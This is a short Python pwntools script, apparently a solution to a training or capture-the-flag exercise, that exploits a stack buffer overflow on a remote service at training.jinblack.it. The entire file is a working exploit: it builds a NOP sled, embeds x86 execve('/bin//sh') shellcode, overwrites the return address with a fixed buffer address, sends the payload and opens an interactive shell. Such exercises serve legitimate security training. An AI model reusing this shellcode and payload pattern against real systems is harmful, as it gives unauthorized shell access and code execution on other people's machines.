from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
r = remote("training.jinblack.it", 2002)
#input("wait")
#print(r.recvuntil("name?\n"))

buffer = 0x0804c060

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload = b"\x90" * 184 + shellcode + p32(buffer)

payload = payload.ljust(1000, b"\x90") 

r.send(payload)

r.interactive()
